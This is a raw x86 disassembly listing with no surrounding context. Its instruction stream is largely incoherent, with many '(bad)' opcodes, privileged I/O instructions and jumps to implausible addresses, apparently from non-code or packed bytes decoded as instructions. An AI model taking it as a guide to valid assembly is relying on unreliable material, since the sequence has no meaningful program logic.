  42752c:	ror    BYTE PTR [ebx+0x75000800],0x50
  427533:	xor    eax,DWORD PTR [ebp+0x3]
  427536:	jne    0x427589
  427538:	call   DWORD PTR [eax-0x3c]
  42753b:	mov    DWORD PTR [ecx-0x18],edx
  42753e:	mov    edi,edi
  427540:	call   0x8b45bac9
  427545:	add    ah,ah
  427547:	rol    BYTE PTR [ebp-0x7c],0xeb
  42754b:	add    edi,edi
  42754d:	add    al,ch
  42754f:	inc    ebp
  427550:	push   ecx
  427551:	cmp    ecx,DWORD PTR [ebx+0x45c7c49c]
  427557:	mov    al,0xc7
  427559:	test   esp,esp
  42755b:	clc    
  42755c:	test   DWORD PTR [ebp-0x8],ecx
  42755f:	add    BYTE PTR [ebp+0x50],0x39
  427563:	jmp    0x8bcbfe04
  427568:	in     al,dx
  427569:	or     BYTE PTR [ebp-0xf],al
  42756c:	xor    eax,DWORD PTR [eax+0x4f896803]
  427572:	hlt    
  427573:	mov    eax,DWORD PTR [ebp-0x50]
  427576:	xor    esi,ecx
  427578:	add    eax,DWORD PTR [eax+0x4f086889]
  42757e:	inc    ebp
  42757f:	sbb    eax,0x68
  427582:	pushf  
  427583:	inc    edi
  427585:	add    al,ch
  427587:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427588:	test   edi,edi
  42758a:	clc    
  42758b:	inc    DWORD PTR [ebp-0x73]
  42758e:	cmp    esi,DWORD PTR [esp+ebx*4-0x1]
  427592:	(bad)  
  427593:	push   ecx
  427594:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427595:	jne    0x42751c
  427597:	push   eax
  427598:	clc    
  427599:	test   DWORD PTR [ebp-0x1],eax
  42759c:	cmp    eax,0xc78b9cff
  4275a1:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  4275a8:	inc    ebp
  4275a9:	push   edi
  4275aa:	aas    
  4275ab:	sbb    bl,BYTE PTR [eax+eax*1-0x7f1b9775]
  4275b2:	dec    ebp
  4275b3:	add    BYTE PTR [ebx],dh
  4275b5:	inc    ebp
  4275b6:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  4275bc:	enter  0x8401,0x0
  4275c0:	add    al,BYTE PTR [eax]
  4275c2:	add    bh,bh
  4275c4:	out    dx,eax
  4275c5:	sbb    BYTE PTR [eax],al
  4275c7:	dec    ebp
  4275c8:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  4275ce:	sub    esi,DWORD PTR [ebx]
  4275d0:	mov    ebp,DWORD PTR [eax-0x8]
  4275d3:	add    bl,0x0
  4275d6:	(bad)  
  4275d7:	cmp    eax,ecx
  4275d9:	or     BYTE PTR [edx+0x750114],al
  4275df:	inc    DWORD PTR [ebp+0x18]
  4275e2:	mov    eax,DWORD PTR [ebp-0x8]
  4275e5:	mov    ebx,eax
  4275e7:	(bad)  
  4275e8:	retf   
  4275e9:	inc    ebp
  4275ea:	into   
  4275eb:	mov    esi,eax
  4275ed:	int3   
  4275ee:	scas   eax,DWORD PTR es:[edi]
  4275ef:	push   es
  4275f0:	mov    esi,DWORD PTR [ebp-0xc]
  4275f3:	call   DWORD PTR [ebp+0x18]
  4275f6:	sub    edi,DWORD PTR [ebp+0x3b]
  4275f9:	mov    esi,DWORD PTR [edi-0x34]
  4275fc:	mov    eax,DWORD PTR [ebp-0x8]
  4275ff:	cmp    bl,al
  427601:	pushf  
  427602:	mov    bh,0xbc
  427605:	fadd   QWORD PTR [eax]
  427607:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  42760d:	mov    esi,DWORD PTR [ebx]
  42760f:	in     al,0x33
  427611:	ret    
  427612:	add    eax,esi
  427614:	add    eax,DWORD PTR [ebp+0xf]
  427617:	mov    eax,ecx
  427619:	in     al,0x4d
  42761b:	ret    
  42761c:	mov    eax,esi
  42761e:	in     al,dx
  42761f:	inc    ebp
  427620:	rol    edi,1
  427622:	sar    al,1
  427624:	or     BYTE PTR [ebp+0x45e9f845],al
  42762a:	add    BYTE PTR [edx],bh
  42762c:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  427633:	test   ebx,eax
  427635:	clc    
  427636:	retf   
  427637:	inc    ebp
  427638:	into   
  427639:	cmp    al,0xc6
  42763b:	pushf  
  42763c:	scas   eax,DWORD PTR es:[edi]
  42763d:	(bad)  
  42763e:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  427645:	inc    ebp
  427646:	cmp    edi,DWORD PTR [esi]
  427648:	ja     0x4275e6
  42764a:	mov    eax,edi
  42764c:	mov    esp,0x458567a8
  427651:	clc    
  427652:	mov    eax,DWORD PTR [ebp-0x8]
  427655:	mov    eax,ebx
  427657:	in     al,dx
  427658:	retf   
  427659:	ret    
  42765a:	into   
  42765b:	mov    dh,0x7d
  42765e:	scas   eax,DWORD PTR es:[edi]
  42765f:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  427665:	add    BYTE PTR [ebx],ch
  427667:	jmp    0xb977a7
  42766c:	mov    eax,DWORD PTR [ebp-0x5c]
  42766f:	mov    eax,DWORD PTR [ebp-0x14]
  427672:	inc    ebp
  427673:	enter  0x458b,0xf8
  427677:	xor    eax,ebx
  427679:	add    ecx,ebx
  42767b:	cmp    ecx,esi
  42767d:	shufps xmm7,xmm4,0xaf
  427681:	add    BYTE PTR [ebx+0x55e8f48b],cl
  427687:	dec    ebp
  427688:	sub    esi,DWORD PTR [ebx]
  42768a:	cmp    esi,DWORD PTR [ebx]
  42768c:	ja     0x427691
  42768e:	mov    eax,DWORD PTR [ebx]
  427690:	lods   al,BYTE PTR ds:[esi]
  427691:	mov    db0,ecx
  427694:	inc    ebp
  427695:	dec    ebp
  427696:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  42769c:	retf   
  42769d:	rol    dh,1
  42769f:	or     al,0xce
  4276a1:	inc    ebp
  4276a2:	scas   eax,DWORD PTR es:[edi]
  4276a3:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  4276a9:	add    BYTE PTR [ebx],ch
  4276ab:	add    BYTE PTR [ebx],bh
  4276ad:	inc    ebp
  4276ae:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  4276b4:	inc    ebp
  4276b5:	retf   
  4276b6:	mov    ecx,esi
  4276b8:	clc    
  4276b9:	(bad)  
  4276ba:	retf   
  4276bb:	scas   eax,DWORD PTR es:[edi]
  4276bc:	ret    
  4276bd:	mov    ecx,esi
  4276bf:	hlt    
  4276c0:	(bad)  
  4276c1:	push   ebp
  4276c2:	scas   eax,DWORD PTR es:[edi]
  4276c3:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  4276c9:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  4276cf:	add    BYTE PTR [ebx],al
  4276d1:	mov    eax,eax
  4276d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4276d4:	inc    ebp
  4276d5:	dec    ebp
  4276d6:	cmp    BYTE PTR [ebx],dh
  4276d8:	pushf  
  4276d9:	xor    ecx,DWORD PTR [ecx+0x4503d003]
  4276df:	(bad)  
  4276e1:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  4276e9:	sar    eax,1
  4276eb:	rol    BYTE PTR [ebp+0x5],1
  4276ee:	xor    eax,DWORD PTR [ebp+0x3]
  4276f1:	jmp    0x4276de
  4276f3:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  4276f9:	xor    eax,DWORD PTR [ebp+0x33]
  4276fc:	mov    eax,DWORD PTR [ebx]
  4276fe:	rol    BYTE PTR [ebx],1
  427700:	test   BYTE PTR [edi],cl
  427702:	cwde   
  427703:	shl    DWORD PTR [edx],0x4d
  427706:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  42770c:	xor    edx,eax
  42770e:	add    eax,DWORD PTR ds:0xeb4d45e0
  427714:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  42771a:	add    BYTE PTR [ebx],dh
  42771c:	inc    ebp
  42771d:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  427723:	rdpmc  
  427725:	rol    DWORD PTR [ebx],0x4d
  427728:	loopne 0x4276b5
  42772a:	push   ebp
  42772b:	in     al,dx
  42772c:	mov    cl,dl
  42772e:	adc    eax,edx
  427730:	jb     0x427737
  427732:	add    BYTE PTR [ebp+0x45],al
  427735:	jmp    0x4276c2
  427737:	mov    ebx,eax
  427739:	test   al,0xcb
  42773b:	dec    ebp
  42773c:	dec    ebp
  42773d:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  427743:	add    ebx,DWORD PTR [eax-0x743ecdf1]
  427749:	dec    ebp
  42774a:	mov    al,0x8b
  42774c:	dec    ebp
  42774d:	in     al,dx
  42774e:	xor    edx,ecx
  427750:	xor    edx,eax
  427752:	add    eax,DWORD PTR [ebp+0x3]
  427755:	jbe    0x427766
  427757:	mov    eax,ecx
  427759:	test   al,0x45
  42775b:	dec    ebp
  42775c:	mov    DWORD PTR [ebx],esi
  42775e:	loopne 0x427793
  427760:	inc    ebp
  427761:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  427767:	rol    esi,0x45
  42776a:	scas   eax,DWORD PTR es:[edi]
  42776b:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  427771:	mov    eax,ecx
  427773:	hlt    
  427774:	dec    ebp
  427775:	inc    ebp
  427776:	mov    eax,edi
  427778:	loopne 0x427752
  42777a:	retf   
  42777b:	test   esi,ecx
  42777d:	clc    
  42777e:	scas   eax,DWORD PTR es:[edi]
  42777f:	inc    ebp
  427780:	mov    eax,edi
  427782:	fdiv   st,st(0)
  427784:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  42778a:	cwde   
  42778b:	cmp    dh,BYTE PTR [edx]
  42778d:	pushf  
  42778e:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  427794:	inc    esi
  427796:	mov    ebp,DWORD PTR [eax-0x10]
  427799:	inc    ebp
  42779a:	dec    ebp
  42779b:	xor    esi,DWORD PTR [ebx]
  42779d:	add    eax,DWORD PTR [ebx]
  42779f:	loopne 0x4277b0
  4277a1:	dec    ebp
  4277a2:	ror    DWORD PTR [edx+0x7233084d],0x3
  4277a9:	add    BYTE PTR [ebx-0x7b740bbb],cl
  4277af:	lock cwde 
  4277b1:	ret    
  4277b2:	xor    al,BYTE PTR [ebp-0x77]
  4277b5:	mov    esi,esp
  4277b7:	rol    BYTE PTR [ebp-0x7c],1
  4277ba:	xor    ebx,DWORD PTR [eax-0x7772cd47]
  4277c0:	call   edi
  4277c2:	enter  0x4d45,0x8b
  4277c6:	mov    esi,eax
  4277c8:	fmul   st(3),st
  4277ca:	push   ebp
  4277cb:	dec    ebp
  4277cc:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  4277d2:	ret    0xc198
  4277d5:	xor    al,BYTE PTR [esi-0x280276]
  4277db:	dec    ebp
  4277dc:	jne    0x427811
  4277de:	mov    eax,DWORD PTR [ebx]
  4277e0:	cld    
  4277e1:	loopne 0x427793
  4277e3:	push   ebp
  4277e4:	add    DWORD PTR [eax+0x72851100],ecx
  4277ea:	inc    DWORD PTR [eax]
  4277ec:	inc    DWORD PTR [ebp-0x75]
  4277ef:	mov    edi,esp
  4277f1:	lock add bl,0x1
  4277f5:	retf   
  4277f6:	add    dh,al
  4277f8:	xor    dh,cl
  4277fa:	inc    ebp
  4277fb:	scas   eax,DWORD PTR es:[edi]
  4277fc:	mov    eax,DWORD PTR [ebx]
  4277fe:	shl    al,0x0
  427801:	inc    ebp
  427802:	dec    DWORD PTR [ebx+0x4dccf0ff]
  427808:	call   0x458a40
  42780d:	ud0    eax,ecx
  427810:	adc    al,0x4d
  427812:	inc    ebp
  427813:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  427819:	lock push 0x338055
  42781f:	add    eax,DWORD PTR [eax]
  427821:	ud0    ecx,edx
  427824:	sbb    BYTE PTR [ebp+0x5e],dl
  427827:	xor    ecx,ecx
  427829:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  427830:	push   ecx
  427831:	add    BYTE PTR [ebp-0x38],cl
  427834:	mov    DWORD PTR [esi-0x740004],eax
  42783a:	cld    
  42783b:	inc    ebp
  42783c:	xchg   edx,eax
  42783d:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  427843:	xabort 0xaf
  427846:	icebp  
  427847:	mov    esi,DWORD PTR [ebp-0x28]
  42784a:	(bad)  
  42784b:	retf   
  42784c:	or     ecx,eax
  42784e:	(bad)  
  42784f:	dec    ebp
  427850:	pop    es
  427851:	(bad)  
  427852:	(bad)  
  427853:	or     BYTE PTR [esi],al
  427855:	jb     0x42781d
  427857:	add    BYTE PTR [ebx],al
  427859:	inc    ebp
  42785a:	(bad)  
  42785b:	mov    ecx,DWORD PTR [edx]
  42785d:	fadd   st(6),st
  42785f:	ret    
  427860:	add    ch,BYTE PTR [eax-0x37]
  427863:	int    0x55
  427865:	sub    ebp,esp
  427867:	add    edx,DWORD PTR [ecx-0x14]
  42786a:	inc    ebp
  42786b:	inc    ebp
  42786c:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  427872:	cld    
  427873:	(bad)  
  427874:	mov    gs,WORD PTR [edi+0xf893be0]
  42787a:	mov    ebp,ebp
  42787c:	clc    
  42787d:	push   eax
  42787f:	push   DWORD PTR [ebp-0x4]
  427882:	mov    BYTE PTR [ebp+0xa],0xff
  427886:	(bad)  
  427887:	int3   
  427888:	or     BYTE PTR [eax],al
  42788a:	(bad)  
  42788b:	lea    eax,[edi]
  42788d:	ins    BYTE PTR es:[edi],dx
  42788e:	(bad)  
  42788f:	inc    DWORD PTR [ecx]
  427891:	push   eax
  427892:	mov    BYTE PTR [ebp+0x9],0x8b
  427896:	leave  
  427897:	les    edx,FWORD PTR [ebp+0x0]
  42789a:	in     al,dx
  42789b:	call   DWORD PTR [ecx-0x75]
  42789e:	inc    ebp
  42789f:	cld    
  4278a0:	mov    DWORD PTR [eax+0x8b01fc],eax
  4278a6:	cld    
  4278a7:	xor    BYTE PTR [edi-0x76a8f98b],bh
  4278ad:	std    
  4278ae:	mov    eax,DWORD PTR [eax]
  4278b0:	clc    
  4278b1:	test   eax,esi
  4278b3:	je     0x42792a
  4278b5:	mov    eax,esi
  4278b7:	cld    
  4278b8:	add    al,0x80
  4278ba:	add    WORD PTR [ecx+0x0],ax
  4278be:	fadd   QWORD PTR [eax]
  4278c0:	mov    BYTE PTR [eax],0xd0
  4278c3:	push   0xffffffc3
  4278c5:	push   edi
  4278c6:	mov    edx,DWORD PTR [eax+0x51]
  4278c9:	pop    edi
  4278ca:	lea    ebx,[ebx-0x8]
  4278cd:	ret    0x45
  4278d0:	mov    ecx,DWORD PTR [ebx-0x7241ae04]
  4278d6:	xchg   eax,edi
  4278d8:	mov    DWORD PTR [ebp-0x75],ecx
  4278db:	push   esi
  4278dc:	clc    
  4278dd:	jne    0x4278af
  4278df:	mov    ecx,0xf8450b0b
  4278e4:	(bad)  
  4278e5:	push   cs
  4278e6:	or     BYTE PTR [ebp-0x3a],dh
  4278e9:	cmp    eax,DWORD PTR [ecx]
  4278eb:	pop    esi
  4278ec:	(bad)  
  4278ed:	or     al,0x5
  4278ef:	inc    eax
  4278f0:	leave  
  4278f1:	in     al,dx
  4278f2:	add    al,0x42
  4278f4:	push   esi
  4278f5:	and    eax,0xedc940cf
  4278fa:	inc    DWORD PTR [eax-0x75]
  4278fd:	fmul   QWORD PTR [ebx-0xf8739be]
  427903:	inc    eax
  427904:	nop
  427905:	jmp    0x518b:0x8b8bc3ff
  42790c:	(bad)  
  42790d:	lea    eax,ds:0xff45e8f8
  427913:	push   esi
  427914:	push   DWORD PTR [ebp-0x39]
  427917:	mov    eax,0x7edda46
  42791c:	or     al,0x6
  42791e:	push   DWORD PTR [ebp-0x3a]
  427921:	cmp    eax,DWORD PTR [edx]
  427923:	pop    esi
  427924:	ret    
  427925:	or     al,0x56
  427927:	inc    ecx
  427928:	push   ebp
  427929:	js     0x427917
  42792b:	inc    edx
  42792c:	inc    ebp
  42792d:	int    0x1
  42792f:	inc    ecx
  427930:	sub    BYTE PTR ds:0xe77541fc,ah
  427936:	add    DWORD PTR [edx+0x1c],eax
  427939:	int3   
  42793a:	mov    eax,ebx
  42793c:	adc    al,0x8b
  42793e:	xchg   edx,eax
  42793f:	push   ecx
  427940:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  427946:	rcl    DWORD PTR [esi-0x9],cl
  427949:	jne    0x42799b
  42794b:	mov    eax,0x7c80ece
  427950:	rol    DWORD PTR [esi],cl
  427952:	div    DWORD PTR [ebp+0x50]
  427955:	cmp    ecx,edx
  427957:	pop    esi
  427958:	dec    BYTE PTR [edx]
  42795a:	in     al,dx
  42795b:	inc    edx
  42795c:	sub    ebp,ecx
  42795e:	inc    eax
  42795f:	(bad)  
  427960:	push   eax
  427961:	add    edx,DWORD PTR [eax-0x17]
  427964:	push   edi
  427965:	add    dh,dh
  427967:	leave  
  427968:	adc    DWORD PTR [ebp-0x1],0xffffffec
  42796c:	add    BYTE PTR [ecx+0x0],dl
  42796f:	inc    ebp
  427970:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  427976:	add    BYTE PTR [eax-0x7fbf448],bh
  42797c:	add    al,0x2
  42797e:	jmp    0x57e24d8
  427983:	jne    0x42796d
  427985:	mov    eax,DWORD PTR [edx]
  427987:	or     BYTE PTR [eax],al
  427989:	inc    ecx
  42798a:	stc    
  42798b:	in     eax,dx
  42798c:	ss inc eax
  42798e:	aas    
  42798f:	out    0x7d,eax
  427991:	inc    ecx
  427992:	mov    esi,ecx
  427994:	lock ret 0x7d
  427998:	and    ecx,DWORD PTR [ebx-0x171777]
  42799e:	add    bh,bh
  4279a0:	aad    0xd7
  4279a2:	add    dh,cl
  4279a4:	clts   
  4279a6:	(bad)  
  4279a7:	call   0xffcd78ac
  4279ac:	hlt    
  4279ad:	iret   
  4279ae:	jge    0x427986
  4279b0:	rol    DWORD PTR [esi-0x80],cl
  4279b3:	icebp  
  4279b4:	or     BYTE PTR [edi-0x27],cl
  4279b7:	(bad)  
  4279b8:	out    dx,al
  4279b9:	mov    eax,DWORD PTR [ebx]
  4279bb:	(bad)  
  4279bc:	pop    esi
  4279bd:	push   es
  4279be:	cmp    al,0xe8
  4279c0:	sar    edi,0x8
  4279c3:	inc    DWORD PTR [edi]
  4279c5:	inc    esi
  4279c6:	(bad)  
  4279c7:	jmp    0x8b00:0x530e577e
  4279ce:	push   esi
  4279cf:	mov    eax,DWORD PTR [eax]
  4279d1:	and    al,0x0
  4279d3:	inc    ebp
  4279d4:	push   eax
  4279d5:	push   eax
  4279d6:	add    DWORD PTR [ebx+0x757d1834],ecx
  4279dc:	sub    edx,DWORD PTR [esi-0x24]
  4279df:	jne    0x427997
  4279e1:	lods   eax,DWORD PTR ds:[esi]
  4279e2:	mov    edx,DWORD PTR [edx-0x34]
  4279e5:	dec    esi
  4279e6:	out    0x83,eax
  4279e8:	into   
  4279e9:	push   edi
  4279eb:	loopne 0x4279bb
  4279ed:	shr    BYTE PTR [edx+ecx*4+0x0],1
  4279f1:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  4279f8:	rol    DWORD PTR [edx],0x8
  4279fb:	mov    esp,ecx
  4279fd:	cmp    DWORD PTR [ebx],0xc
  427a00:	mov    esi,0x5001c0
  427a05:	push   eax
  427a06:	push   cs
  427a07:	push   eax
  427a08:	(bad)  
  427a09:	sub    edx,edi
  427a0b:	push   esi
  427a0c:	adc    al,0xcb
  427a0e:	ins    DWORD PTR es:[edi],dx
  427a0f:	mov    eax,0x203e8
  427a14:	add    al,ah
  427a16:	ror    BYTE PTR [eax+0xc007c0],0xc0
  427a1d:	add    dh,al
  427a1f:	add    ah,ch
  427a21:	rol    DWORD PTR [ebx-0x3595fb0d],1
  427a27:	pop    ecx
  427a28:	or     eax,ebx
  427a2a:	cli    
  427a2b:	add    BYTE PTR [ecx-0x4e728d1e],dh
  427a31:	lea    ebp,[ebx]
  427a33:	mov    edx,DWORD PTR [edx-0x4]
  427a36:	dec    ecx
  427a37:	inc    ebp
  427a38:	shr    BYTE PTR [ebx],0x4b
  427a3b:	and    al,0x0
  427a3d:	(bad)  
  427a3e:	jne    0x427a85
  427a40:	pop    eax
  427a41:	mov    al,0x5a
  427a43:	call   0x1417ca2
  427a48:	and    al,0x85
  427a4a:	push   edx
  427a4b:	add    BYTE PTR [eax+eax*1+0x0],ah
  427a4f:	dec    ebp
  427a50:	mov    cl,0x23
  427a52:	jmp    0x427a40
  427a54:	mov    al,0xe7
  427a56:	call   0x1387d44
  427a5b:	shr    DWORD PTR [eax+ebx*2],cl
  427a5e:	lock (bad) 
  427a60:	adc    eax,0x757f008d
  427a65:	out    0x58,eax
  427a67:	cmp    al,0x7
  427a69:	pop    edx
  427a6a:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  427a71:	push   ecx
  427a72:	cld    
  427a73:	mov    esi,0x3b0175
  427a78:	and    al,0xb0
  427a7a:	xor    BYTE PTR [edx+0x1],0x8b
  427a7e:	add    ah,bh
  427a80:	mov    edi,DWORD PTR [ebp-0x4]
  427a83:	psubsw mm7,QWORD PTR [edi]
  427a86:	add    DWORD PTR [ebp+0x0],ebp
  427a89:	rcr    eax,1
  427a8b:	mov    edi,ecx
  427a8d:	and    eax,DWORD PTR [eax]
  427a8f:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  427a95:	call   0x12f7d7e
  427a9a:	add    al,cl
  427a9c:	mov    ebp,esi
  427a9e:	aam    0x83
  427aa0:	or     DWORD PTR [ecx],eax
  427aa2:	jne    0x427a95
  427aa4:	mov    eax,DWORD PTR [eax]
  427aa6:	aam    0x0
  427aa8:	dec    ebp
  427aa9:	jne    0x427a36
  427aab:	cmp    ebx,eax
  427aad:	jb     0x427afc
  427aaf:	jmp    0x427a3c
  427ab1:	mov    ebx,esp
  427ab3:	int3   
  427ab4:	dec    ebp
  427ab5:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  427abc:	mov    edx,0x8b0a8b
  427ac1:	cmp    ecx,DWORD PTR [eax]
  427ac3:	jb     0x427a9c
  427ac5:	pop    edx
  427ac6:	push   edi
  427ac7:	cli    
  427ac8:	pop    es
  427ac9:	mov    eax,ecx
  427acb:	jb     0x427acf
  427acd:	add    DWORD PTR [ebx],0xa
  427ad0:	mov    eax,DWORD PTR [ebx]
  427ad2:	int3   
  427ad3:	add    bh,BYTE PTR [esi+0x75d10006]
  427ad9:	jmp    0x427a66
  427adb:	mov    al,0xe8
  427add:	call   0x1037d5f
  427ae2:	add    edx,DWORD PTR [ecx+ecx*8]
  427ae5:	pop    edi
  427ae6:	or     BYTE PTR [ecx-0x73],bl
  427ae9:	pop    ecx
  427aea:	inc    edi
  427aeb:	xor    al,0xeb
  427aed:	push   ecx
  427aee:	mov    edi,DWORD PTR [edx+0xc506cc]
  427af4:	call   0xb17bf9
  427af9:	int3   
  427afa:	sbb    BYTE PTR [esi],ch
  427afc:	inc    ebp
  427afd:	add    BYTE PTR [ebx-0x1f4f338b],cl
  427b03:	call   0x9b7d72
  427b08:	or     BYTE PTR [ebx-0x73],dl
  427b0b:	cmp    al,0x47
  427b0d:	mov    al,0x1
  427b0f:	jb     0x427b11
  427b11:	mov    al,0x10
  427b13:	push   eax
  427b14:	add    al,0x75
  427b16:	add    BYTE PTR [ebx],ch
  427b18:	add    ebx,esp
  427b1a:	int3   
  427b1b:	jne    0x427b2d
  427b1d:	movsx  edx,cl
  427b20:	add    DWORD PTR [eax],eax
  427b22:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  427b29:	mov    gs,edi
  427b2b:	add    BYTE PTR [eax-0x50],ch
  427b2e:	add    al,ch
  427b30:	mov    eax,DWORD PTR [ecx]
  427b32:	sub    eax,DWORD PTR [eax]
  427b34:	jb     0x427bab
  427b36:	add    DWORD PTR [esp+eiz*8-0x50],esi
  427b3a:	jge    0x427b24
  427b3c:	add    al,0x1
  427b3e:	add    DWORD PTR [eax],0x0
  427b41:	jne    0x427b43
  427b43:	je     0x427b8a
  427b45:	mov    eax,DWORD PTR [edi]
  427b47:	ror    BYTE PTR [ebp+0x4d],1
  427b4a:	or     DWORD PTR [ecx+0x4d03d004],0x3
  427b51:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  427b57:	mov    DWORD PTR [ebx],ebp
  427b59:	fadd   DWORD PTR [eax+0x75]
  427b5c:	inc    eax
  427b5d:	pop    eax
  427b5e:	lea    ebx,[ecx+0x4f]
  427b61:	push   0xb1000003
  427b66:	out    dx,eax
  427b67:	add    ebp,DWORD PTR [edx+edx*2]
  427b6a:	add    BYTE PTR [ebx+ecx*4],bh
  427b6d:	mov    ch,BYTE PTR [ebx]
  427b6f:	jb     0x427be3
  427b71:	add    al,0x89
  427b73:	push   eax
  427b74:	call   0x842ac8e6
  427b79:	add    DWORD PTR [eax+eax*1],eax
  427b7c:	jae    0x427b92
  427b7e:	icebp  
  427b7f:	inc    ebp
  427b80:	mov    eax,DWORD PTR gs:[ecx]
  427b83:	int3   
  427b84:	out    dx,al
  427b85:	loopne 0x427bd4
  427b87:	sub    eax,DWORD PTR [edx]
  427b89:	push   0xffffff83
  427b8b:	pop    esi
  427b8c:	push   cs
  427b8d:	jl     0x427ba8
  427b8f:	add    al,0xaf
  427b91:	xor    eax,0x832b6d00
  427b96:	mov    eax,DWORD PTR [edx]
  427b98:	rcr    BYTE PTR [ebp+0x754500dc],cl
  427b9e:	ror    DWORD PTR [ebx+0x7dc8e803],1
  427ba4:	inc    ebp
  427ba5:	shr    ebx,0x3
  427ba8:	or     DWORD PTR [eax],0x4
  427bab:	push   0xffffffa5
  427bad:	pop    esi
  427bae:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  427bb5:	jmp    0x427c14
  427bb7:	mov    edi,0xff0272
  427bbc:	fdivr  QWORD PTR [ebp+0x5d]
  427bbf:	push   0x4e
  427bc1:	pop    ecx
  427bc2:	call   0x42bfc7
  427bc7:	mov    DWORD PTR [ebx],eax
  427bc9:	in     al,0xc8
  427bcb:	rol    BYTE PTR [ebp-0x75],0xc1
  427bcf:	call   0xac7db0
  427bd4:	pop    esi
  427bd5:	enter  0xceff,0x8b
  427bd9:	repz mov ecx,DWORD PTR [ebp-0x34]
  427bdd:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  427be4:	je     0x427be6
  427be6:	or     DWORD PTR [ebx-0x74183b24],eax
  427bec:	jne    0x427bd2
  427bee:	jmp    0x427be9
  427bf0:	push   DWORD PTR [edx-0x24]
  427bf3:	push   0x4d
  427bf5:	pop    ecx
  427bf6:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  427bfa:	jge    0x427c02
  427bfc:	mov    eax,eax
  427bfe:	sub    ebp,DWORD PTR [edx+0x24]
  427c01:	pop    esi
  427c02:	inc    ebp
  427c03:	mov    esp,0x8b6077
  427c08:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  427c0e:	lods   al,BYTE PTR ds:[esi]
  427c0f:	add    BYTE PTR [ebx],bh
  427c11:	enter  0xce73,0x49
  427c15:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  427c1d:	stc    
  427c1e:	jge    0x427c92
  427c20:	jnp    0xdd41ff8f
  427c26:	call   0xc57cfc
  427c2b:	fadd   st(0),st
  427c2d:	dec    esi
  427c2e:	ins    BYTE PTR es:[edi],dx
  427c2f:	stc    
  427c30:	cmp    al,0x73
  427c32:	push   ebp
  427c33:	mov    eax,0xf8028b
  427c38:	jne    0x427bfb
  427c3a:	mov    esi,ecx
  427c3c:	mov    esp,DWORD PTR [ebp+0x2c]
  427c3f:	add    edi,DWORD PTR [ebp-0x24]
  427c42:	sub    esp,eax
  427c44:	and    al,0x45
  427c46:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  427c4c:	sbb    al,0xee
  427c4e:	pop    esi
  427c4f:	call   0x827c7f
  427c54:	fsubr  st,st(3)
  427c56:	sti    
  427c57:	add    BYTE PTR gs:[ecx],bh
  427c5a:	add    eax,esp
  427c5c:	add    DWORD PTR [esi],eax
  427c5e:	rol    DWORD PTR [ebp+0x8],0x29
  427c62:	mov    esp,eax
  427c64:	clc    
  427c65:	jne    0x427cdc
  427c67:	mov    eax,0x8b0673
  427c6c:	loopne 0x427cb3
  427c6e:	loopne 0x427bf9
  427c70:	lods   al,BYTE PTR ds:[esi]
  427c71:	int3   
  427c72:	inc    ebp
  427c73:	mov    DWORD PTR gs:[eax+edi*8],eax
  427c77:	add    al,0xc3
  427c79:	sub    ecx,DWORD PTR [ebp+0x47]
  427c7c:	(bad)  
  427c7e:	shr    BYTE PTR [ebp-0x1f],0xe8
  427c82:	add    eax,DWORD PTR [eax]
  427c84:	call   0x6443d89
  427c89:	add    esi,DWORD PTR [esi-0x3b2efc83]
  427c8f:	dec    esi
  427c90:	ins    DWORD PTR es:[edi],dx
  427c91:	in     al,dx
  427c92:	lea    eax,[eax]
  427c94:	inc    ebp
  427c95:	inc    ebp
  427c96:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  427c9c:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  427ca6:	and    al,0xdc
  427ca8:	ror    DWORD PTR [edx+0x24],0xf7
  427cac:	or     BYTE PTR [ebp+0x4c],dh
  427caf:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  427cb3:	stos   BYTE PTR es:[edi],al
  427cb4:	adc    edx,edi
  427cb6:	inc    esp
  427cb7:	add    edi,DWORD PTR [eax]
  427cb9:	jne    0x427c9e
  427cbb:	mov    DWORD PTR [eax-0x7449db04],ecx
  427cc1:	cmp    ecx,DWORD PTR [edi]
